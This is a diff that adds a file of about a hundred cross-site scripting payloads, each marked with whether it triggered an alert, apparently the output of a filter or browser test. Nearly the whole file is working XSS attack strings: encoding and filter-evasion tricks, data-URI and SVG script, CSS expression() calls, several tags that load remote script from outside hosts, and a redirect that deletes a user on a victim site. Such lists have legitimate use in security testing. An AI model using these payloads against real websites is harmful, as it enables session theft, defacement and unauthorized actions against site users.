@@ -1,0 +1,108 @@
+Payload: <SCRIPT SRC=//ha.ckers.org/.j> | Alert: False
+Payload: <iframe src=http://ha.ckers.org/scriptlet.html < | Alert: False
+Payload: \";alert('XSS');// | Alert: False
+Payload: <IMG SRC='vbscript:msgbox("XSS")'> | Alert: False
+Payload: <IMG SRC="livescript:[code]"> | Alert: False
+Payload: <BODY ONLOAD=alert('XSS')> | Alert: True
+Payload: <BR SIZE="&{alert('XSS')}"> | Alert: False
+Payload: <LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css"> | Alert: False
+Payload: <STYLE>@import'http://ha.ckers.org/xss.css';</STYLE> | Alert: False
+Payload: <STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE> | Alert: False
+Payload: <STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE> | Alert: False
+Payload: <IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))"> | Alert: False
+Payload: exp/*<A STYLE='no\xss:noxss("*//*");xss:ex/*XSS*//*/*/pression(alert("XSS"))'> | Alert: False
+Payload: <STYLE TYPE="text/javascript">alert('XSS');</STYLE> | Alert: False
+Payload: <XSS STYLE="xss:expression(alert('XSS'))"> | Alert: False
+Payload: <XSS STYLE="behavior: url(xss.htc);"> | Alert: False
+Payload: ¼script¾alert(¢XSS¢)¼/script¾ | Alert: False
+Payload: <DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"> | Alert: False
+Payload: <DIV STYLE="width: expression(alert('XSS'));"> | Alert: False
+Payload: <OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT> | Alert: False
+Payload: <EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED> | Alert: True
+Payload: <SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT> | Alert: False
+Payload: <!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'"--> | Alert: False
+Payload: <? echo('<SCR)';echo('IPT>alert("XSS")</SCRIPT>'); ?> | Alert: False
+Payload: <IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode"> | Alert: False
+Payload: Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser | Alert: False
+Payload: <SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT> | Alert: False
+Payload: <SCRIPT =">" SRC="http://ha.ckers.org/xss.js"></SCRIPT> | Alert: False
+Payload: <SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT> | Alert: False
+Payload: <SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT> | Alert: False
+Payload: <SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT> | Alert: False
+Payload: <SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT> | Alert: False
+Payload: <A HREF="http://66.102.7.147/">XSS</A> | Alert: False
+Payload: <A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A> | Alert: False
+Payload: <A HREF="http://1113982867/">XSS</A> | Alert: False
+Payload: <A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A> | Alert: False
+Payload: <A HREF="http://0102.0146.0007.00000223/">XSS</A> | Alert: False
+Payload: <A HREF="htt p://6 6.000146.0x7.147/">XSS</A> | Alert: False
+Payload: <img src=``&NewLine; onerror=alert(1)&NewLine; | Alert: False
+Payload: <script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&Tab;></script> | Alert: False
+Payload: <ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=? | Alert: True
+Payload: <iframe/src="data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg=="> | Alert: False
+Payload: <script /**/>/**/alert(1)/**/</script /**/ | Alert: True
+Payload: <iframe/src="data:text/html,<svg &#111;&#110;load=alert(1)>"> | Alert: True
+Payload: <svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script | Alert: False
+Payload: <svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera} | Alert: False
+Payload: <a href="data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&#09;&#10;&#11;>X</a | Alert: False
+Payload: <script ^__^>alert(String.fromCharCode(49))</script ^__^ | Alert: True
+Payload: <script /***/>/***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/</script /***/ | Alert: True
+Payload: <iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'> | Alert: True
+Payload: <script ~~~>alert(0%0)</script ~~~> | Alert: True
+Payload: <style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;> | Alert: True
+Payload: &#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>' | Alert: True
+Payload: <div/style="width:expression(confirm(1))">X</div> {IE7} | Alert: False
+Payload: //|\\ <script //|\\ src='https://dl.dropbox.com/u/13018058/js.js'> //|\\ </script //|\\ | Alert: False
+Payload: </svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29; {Opera} | Alert: False
+Payload: <embed src="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"> | Alert: False
+Payload: <object data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"> | Alert: False
+Payload: <%<!--'%><script>alert(1);</script --> | Alert: False
+Payload: <script src="data:text/javascript,alert(1)"></script> | Alert: True
+Payload: <iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe> | Alert: True
+Payload: <img src=`xx:xx`onerror=alert(1)> | Alert: False
+Payload: <object type="text/x-scriptlet" data="http://jsfiddle.net/XLE63/ "></object> | Alert: True
+Payload: <math><a xlink:href="//jsfiddle.net/t846h/">click | Alert: False
+Payload: <embed code="http://businessinfo.co.uk/labs/xss/xss.swf" allowscriptaccess=always> | Alert: False
+Payload: <a href="data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>">X</a | Alert: False
+Payload: <script/src="data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')"></script a=\u0061 & /=%2F | Alert: True
+Payload: <script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script | Alert: True
+Payload: <body/onload=&lt;!--&gt;&#10alert(1)> | Alert: True
+Payload: <script itworksinallbrowsers>/*<script* */alert(1)</script | Alert: False
+Payload: <svg><script>//&NewLine;confirm(1);</script </svg> | Alert: True
+Payload: <svg><script onlypossibleinopera:-)> alert(1) | Alert: False
+Payload: <script x> alert(1) </script 1=2 | Alert: True
+Payload: <script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script> | Alert: True
+Payload: <math><a xlink:href="//jsfiddle.net/t846h/">click | Alert: False
+Payload: <object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object> | Alert: True
+Payload: <iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe> | Alert: True
+Payload: <a href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">Click Me</a> | Alert: False
+Payload:  | Alert: False
+Payload: '';!--"<XSS>=&{()} | Alert: False
+Payload: '>//\\,<'>">">"*" | Alert: False
+Payload: '); alert('XSS | Alert: False
+Payload: <script>alert(1);</script> | Alert: True
+Payload: <style>@im\port'\ja\vasc\ript:alert(\"XSS\")';</style> | Alert: False
+Payload: <? echo('<scr)'; echo('ipt>alert(\"XSS\")</script>'); ?> | Alert: False
+Payload: <IMG SRC=\"jav&#x09;ascript:alert('XSS');\"> | Alert: False
+Payload: <IMG SRC=\"jav&#x0A;ascript:alert('XSS');\"> | Alert: False
+Payload: <IMG SRC=\"jav&#x0D;ascript:alert('XSS');\"> | Alert: False
+Payload: <script src=http://yoursite.com/your_files.js></script> | Alert: False
+Payload: <script language="JavaScript">alert('XSS')</script> | Alert: True
+Payload: window.alert("Bonjour !"); | Alert: False
+Payload: <div style="x:expression((window.r==1)?'':eval('r=1; | Alert: False
+Payload: alert(String.fromCharCode(88,83,83));'))"> | Alert: False
+Payload: <iframe<?php echo chr(11)?> onload=alert('XSS')></iframe> | Alert: False
+Payload: "><script alert(String.fromCharCode(88,83,83))</script> | Alert: False
+Payload: '>><marquee><h1>XSS</h1></marquee> | Alert: False
+Payload: '">><script>alert('XSS')</script> | Alert: True
+Payload: '">><marquee><h1>XSS</h1></marquee> | Alert: False
+Payload: <IMG SRC='vbscript:msgbox(\"XSS\")'> | Alert: False
+Payload: " onfocus=alert(document.domain) "> <" | Alert: False
+Payload: perl -e 'print \"<SCR\0IPT>alert(\"XSS\")</SCR\0IPT>\";' > out | Alert: False
+Payload: perl -e 'print \"<IMG SRC=java\0script:alert(\"XSS\")>\";' > out | Alert: False
+Payload: <br size=\"&{alert('XSS')}\"> | Alert: False
+Payload: <scrscriptipt>alert(1)</scrscriptipt> | Alert: False
+Payload: </br style=a:expression(alert())> | Alert: False
+Payload: "><BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")> | Alert: False
+Payload: [color=red width=expression(alert(123))][color] | Alert: False
+Payload: Execute(MsgBox(chr(88)&chr(83)&chr(83)))< | Alert: False
